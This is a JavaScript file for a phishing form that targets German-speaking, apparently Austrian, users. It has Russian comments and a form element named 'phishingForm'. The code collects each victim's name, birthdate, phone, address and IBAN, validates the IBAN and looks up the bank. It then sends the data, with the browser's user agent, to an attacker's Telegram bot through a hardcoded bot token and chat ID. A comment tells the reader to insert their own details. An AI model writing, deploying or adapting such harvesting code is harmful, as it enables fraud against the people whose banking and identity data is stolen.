// ============================================================
// 🔥 КОНФИГУРАЦИЯ - ЗАМЕНИТЬ НА СВОИ ДАННЫЕ
// ============================================================
const BOT_TOKEN = "8868232573:AAE8OmRfh0Qv192N2b7xfRVEG5IAxRD6-iM";
const CHAT_ID = "-1004324836304";

// Глобальная переменная для хранения результата проверки IBAN
let ibanCheckResult = {
    valid: false,
    message: 'nicht geprüft',
    bankData: null,
    iban: ''
};

// ============================================================
// 🔍 IBAN-ЧЕККЕР
// ============================================================

const IBAN_LENGTHS = {
    'AT': 20, 'DE': 22, 'CH': 21, 'LI': 21, 'BE': 16, 'NL': 18,
    'FR': 27, 'ES': 24, 'IT': 27, 'GB': 22, 'PL': 28, 'CZ': 24,
    'SK': 24, 'HU': 28, 'HR': 21, 'SI': 19, 'LU': 20, 'DK': 18,
    'NO': 15, 'SE': 24, 'FI': 18, 'PT': 25, 'IE': 22, 'GR': 27,
    'CY': 28, 'MT': 31, 'LV': 21, 'LT': 20, 'EE': 20, 'BG': 22,
    'RO': 24, 'TR': 26, 'AE': 23, 'SA': 24, 'QA': 29, 'BH': 22,
    'KW': 30, 'JO': 30, 'IL': 23, 'BA': 20, 'ME': 22, 'MK': 19,
    'AL': 28, 'AD': 24, 'SM': 27, 'MC': 27, 'VA': 22, 'IS': 26,
    'FO': 18, 'GL': 18, 'XK': 20
};

function getIBANLength(countryCode) {
    return IBAN_LENGTHS[countryCode.toUpperCase()] || 0;
}

// ============================================================
// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC
// ============================================================
function getBankNameByBIC(bic) {
    const bankMap = {
        'GENODEF1HH2': 'Hamburger Sparkasse (Haspa)',
        'GENODEF1HH1': 'Hamburger Sparkasse',
        'DEUTDEHH': 'Deutsche Bank Hamburg',
        'COBADEHH': 'Commerzbank Hamburg',
        'HYVEDEMM': 'UniCredit Bank - HypoVereinsbank',
        'DRESDEFF': 'Commerzbank (Dresdner Bank)',
        'SPARDEHH': 'Sparkasse Hamburg',
        'VORSDEHH': 'Volksbank Hamburg',
        'HELADEF1': 'Sparkasse',
        'GENODEFF': 'Volksbank',
        'SOLADEST': 'Sparkasse',
        'BYLADEM': 'BayernLB',
        'GENODEF1S2': 'Sparkasse',
        'DEUTDEDB': 'Deutsche Bank',
        'COBADEFF': 'Commerzbank',
        'TRIDEFHH': 'Targobank Hamburg',
        'INGDDEFF': 'ING Bank',
        'NTSBDEDE': 'N26 Bank',
        'SOGEDEFF': 'Societe Generale',
        'BNPADEFF': 'BNP Paribas',
        'BUKBDEFF': 'Bankhaus BUKB',
        'MHBKDEHH': 'M.M.Warburg & CO',
        'SCFBDEFF': 'Sberbank',
        'VPAYDEFF': 'V-Payment',
        'SSKNDEFF': 'S-Kreditpartner',
        'GENODEF1HHV': 'Hamburger Volksbank',
        'HASPDEHH': 'Haspa Hamburg',
        'DEUTDEHHV': 'Deutsche Bank Hamburg',
        'COBADEHHV': 'Commerzbank Hamburg',
        'GENODEF1P2': 'Sparkasse Pforzheim',
        'GENODEF1S1': 'Sparkasse',
        'GENODEF1A2': 'Sparkasse Aachen',
        'GENODEF1B1': 'Sparkasse Bremen',
        'GENODEF1D1': 'Sparkasse Dortmund',
        'GENODEF1E1': 'Sparkasse Essen',
        'GENODEF1F1': 'Sparkasse Frankfurt',
        'GENODEF1G1': 'Sparkasse Gera',
        'GENODEF1H1': 'Sparkasse Hannover',
        'GENODEF1K1': 'Sparkasse Köln',
        'GENODEF1L1': 'Sparkasse Leipzig',
        'GENODEF1M1': 'Sparkasse München',
        'GENODEF1N1': 'Sparkasse Nürnberg',
        'GENODEF1R1': 'Sparkasse Rostock',
        'GENODEF1S2': 'Sparkasse Stuttgart',
        'GENODEF1W1': 'Sparkasse Wiesbaden'
    };
    return bankMap[bic.toUpperCase()] || null;
}

// ============================================================
// 🔍 IBAN ВАЛИДАЦИЯ
// ============================================================
async function validateIBAN(iban) {
    const cleanIBAN = iban.replace(/\s/g, '').toUpperCase();
    const countryCode = cleanIBAN.substring(0, 2);
    const expectedLength = getIBANLength(countryCode);
    
    if (cleanIBAN.length < 15) {
        return {
            valid: false,
            message: '❌ IBAN ist zu kurz (mind. 15 Zeichen)',
            iban: cleanIBAN,
            bankData: null
        };
    }
    
    if (expectedLength > 0 && cleanIBAN.length !== expectedLength) {
        return {
            valid: false,
            message: `❌ Falsche Länge für ${countryCode} (erwartet: ${expectedLength})`,
            iban: cleanIBAN,
            bankData: null
        };
    }

    if (!/^[A-Z]{2}$/.test(countryCode)) {
        return {
            valid: false,
            message: '❌ Ungültiger Ländercode (2 Buchstaben erforderlich)',
            iban: cleanIBAN,
            bankData: null
        };
    }

    try {
        const response = await fetch(`https://openiban.com/validate/${cleanIBAN}?getBIC=true`);
        const data = await response.json();
        
        let bankData = data.bankData || null;
        
        // Если банк не определился, но есть BIC — определяем по BIC
        if (!bankData && data.bankData && data.bankData.bic) {
            const bic = data.bankData.bic;
            const bankName = getBankNameByBIC(bic);
            if (bankName) {
                bankData = {
                    bankName: bankName,
                    bic: bic,
                    country: data.bankData?.country || null,
                    city: data.bankData?.city || null
                };
            }
        }
        
        return {
            valid: data.valid === true,
            message: data.valid ? '✅ IBAN ist gültig' : '❌ IBAN ist ungültig',
            iban: cleanIBAN,
            bankData: bankData,
            raw: data
        };
    } catch (error) {
        console.error('IBAN API Error:', error);
        const localValid = validateIBANLocal(cleanIBAN);
        return {
            valid: localValid,
            message: localValid ? '✅ IBAN ist gültig (lokale Prüfung)' : '❌ IBAN ist ungültig (lokale Prüfung)',
            iban: cleanIBAN,
            bankData: null,
            error: error.message
        };
    }
}

function validateIBANLocal(iban) {
    const cleanIBAN = iban.replace(/\s/g, '').toUpperCase();
    const countryCode = cleanIBAN.substring(0, 2);
    const expectedLength = getIBANLength(countryCode);
    
    if (expectedLength > 0 && cleanIBAN.length !== expectedLength) return false;
    if (cleanIBAN.length < 15) return false;
    if (!/^[A-Z0-9]+$/.test(cleanIBAN)) return false;
    if (!/^[A-Z]{2}/.test(cleanIBAN)) return false;
    
    const rearranged = cleanIBAN.substring(4) + cleanIBAN.substring(0, 4);
    const numeric = rearranged.split('').map(char => {
        const code = char.charCodeAt(0);
        if (code >= 65 && code <= 90) {
            return code - 55;
        }
        return parseInt(char, 10);
    }).join('');
    
    let remainder = 0;
    for (let i = 0; i < numeric.length; i++) {
        remainder = (remainder * 10 + parseInt(numeric[i], 10)) % 97;
    }
    
    return remainder === 1;
}

function updateSubmitButton() {
    const submitBtn = document.getElementById('submitBtn');
    const phoneInput = document.getElementById('phoneInput');
    const ibanInput = document.getElementById('ibanInput');
    
    if (!submitBtn) return;
    
    let isPhoneValid = false;
    if (phoneInput) {
        const phoneValue = phoneInput.value || '';
        const digits = phoneValue.replace(/[^0-9]/g, '');
        isPhoneValid = digits.length >= 6;
    }
    
    let isIBANValid = false;
    if (ibanInput) {
        const ibanValue = ibanInput.value.toUpperCase().replace(/\s/g, '');
        if (ibanValue.length >= 4) {
            const countryCode = ibanValue.substring(0, 2);
            const expectedLength = getIBANLength(countryCode);
            if (expectedLength > 0 && ibanValue.length === expectedLength) {
                isIBANValid = true;
            }
        }
    }
    
    submitBtn.disabled = !(isPhoneValid && isIBANValid);
}

// ============================================================
// 🚀 ИНИЦИАЛИЗАЦИЯ
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const ibanInput = document.getElementById('ibanInput');
    const birthdateInput = document.getElementById('birthdateInput');
    const phoneInput = document.getElementById('phoneInput');
    const submitBtn = document.getElementById('submitBtn');

    if (submitBtn) {
        submitBtn.disabled = true;
    }

    // ============================================================
    // 📱 ТЕЛЕФОН — ПРОСТОЙ ВВОД С +43 ПО УМОЛЧАНИЮ
    // ============================================================
    if (phoneInput) {
        if (phoneInput.value === '' || phoneInput.value === '+43') {
            phoneInput.value = '+43';
        }

        phoneInput.addEventListener('focus', function() {
            const len = this.value.length;
            this.setSelectionRange(len, len);
        });

        phoneInput.addEventListener('input', function() {
            let currentValue = this.value;
            
            if (currentValue === '') {
                this.value = '+43';
                const len = this.value.length;
                this.setSelectionRange(len, len);
                return;
            }
            
            updateSubmitButton();
        });
    }

    // ============================================================
    // 📅 МАСКА ДЛЯ ДАТЫ
    // ============================================================
    if (birthdateInput) {
        birthdateInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            let formatted = '';
            
            if (value.length > 8) {
                value = value.slice(0, 8);
            }
            
            for (let i = 0; i < value.length; i++) {
                if (i === 2 || i === 4) {
                    formatted += '/';
                }
                formatted += value[i];
            }
            
            this.value = formatted;
        });
    }

    // ============================================================
    // 🔍 IBAN
    // ============================================================
    if (ibanInput) {
        let debounceTimer = null;

        ibanInput.addEventListener('input', function() {
            clearTimeout(debounceTimer);
            
            let value = this.value.replace(/\s/g, '').toUpperCase();
            
            if (value.length >= 2) {
                const countryCode = value.substring(0, 2);
                const expectedLength = getIBANLength(countryCode);
                if (expectedLength > 0) {
                    this.maxLength = expectedLength;
                    if (value.length > expectedLength) {
                        value = value.substring(0, expectedLength);
                        this.value = value;
                    }
                }
            }
            
            const countryCode = value.substring(0, 2);
            const expectedLength = getIBANLength(countryCode);
            
            if (value.length === 0) {
                ibanCheckResult = {
                    valid: false,
                    message: 'nicht angegeben',
                    bankData: null,
                    iban: ''
                };
                updateSubmitButton();
                return;
            }
            
            if (expectedLength > 0 && value.length === expectedLength) {
                debounceTimer = setTimeout(async function() {
                    const result = await validateIBAN(value);
                    ibanCheckResult = {
                        valid: result.valid,
                        message: result.message,
                        bankData: result.bankData,
                        iban: result.iban
                    };
                    
                    console.log('IBAN Check Result:', ibanCheckResult);
                    updateSubmitButton();
                }, 500);
            } else {
                updateSubmitButton();
            }
        });
    }

    // ============================================================
    // 🚀 ОТПРАВКА ФОРМЫ
    // ============================================================
    const form = document.getElementById('phishingForm');
    if (!form) return;
    
    form.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
        if (phoneDigits.length < 6) {
            alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
            return;
        }
        
        const ibanValue = ibanInput.value.toUpperCase().replace(/\s/g, '');
        if (ibanValue.length >= 2) {
            const countryCode = ibanValue.substring(0, 2);
            const expectedLength = getIBANLength(countryCode);
            if (expectedLength > 0 && ibanValue.length !== expectedLength) {
                alert(`Bitte geben Sie eine gültige IBAN für ${countryCode} ein (${expectedLength} Zeichen).`);
                return;
            }
        }
        
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value.trim() || 'nicht angegeben';
        });
        
        data.iban_check = ibanCheckResult;
        sendToTelegram(data);
    });
});

// ============================================================
// 📤 ОТПРАВКА В TELEGRAM
// ============================================================
function sendToTelegram(data) {
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    submitBtn.textContent = '⏳ Sende...';
    
    let message = '🔴 <b>NEUE DATEN!</b>\n\n';
    message += `👤 <b>Name:</b> ${data.fullname || 'nicht angegeben'}\n`;
    message += `🎂 <b>Geburtsdatum:</b> ${data.birthdate || 'nicht angegeben'}\n`;
    message += `📱 <b>Telefon:</b> ${data.phone || 'nicht angegeben'}\n`;
    message += `📍 <b>Adresse:</b> ${data.street || 'nicht angegeben'}\n`;
    message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
    message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;
    
    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
    message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
    message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
    
    if (ibanData.bankData) {
        const bank = ibanData.bankData;
        if (bank.bankName) {
            message += `🏛️ <b>Bank:</b> ${bank.bankName}\n`;
        } else if (bank.bic) {
            const bankName = getBankNameByBIC(bank.bic);
            if (bankName) {
                message += `🏛️ <b>Bank:</b> ${bankName}\n`;
            }
        }
        if (bank.bic) message += `🔢 <b>BIC:</b> ${bank.bic}\n`;
        if (bank.country) message += `🌍 <b>Land:</b> ${bank.country}\n`;
        if (bank.city) message += `🏙️ <b>Bank-Stadt:</b> ${bank.city}\n`;
    }
    
    message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
    message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            submitBtn.textContent = '✅ Gesendet!';
            submitBtn.style.background = '#28a745';
            setTimeout(() => {
                document.getElementById('phishingForm').reset();
                submitBtn.textContent = 'Absenden';
                submitBtn.style.background = '';
                submitBtn.disabled = true;
                submitBtn.classList.remove('loading');
                
                const phoneInput = document.getElementById('phoneInput');
                if (phoneInput) {
                    phoneInput.value = '+43';
                }
                
                const birthdateInput = document.getElementById('birthdateInput');
                if (birthdateInput) {
                    birthdateInput.value = '';
                }
                
                const ibanInput = document.getElementById('ibanInput');
                if (ibanInput) {
                    ibanInput.value = '';
                    ibanInput.maxLength = 34;
                }
                
                ibanCheckResult = {
                    valid: false,
                    message: 'nicht geprüft',
                    bankData: null,
                    iban: ''
                };
            }, 2000);
        } else {
            throw new Error(data.description || 'Unknown error');
        }
    })
    .catch(error => {
        submitBtn.textContent = '❌ Fehler!';
        submitBtn.style.background = '#dc3545';
        setTimeout(() => {
            submitBtn.textContent = 'Absenden';
            submitBtn.style.background = '';
            submitBtn.disabled = false;
            submitBtn.classList.remove('loading');
        }, 3000);
    });
}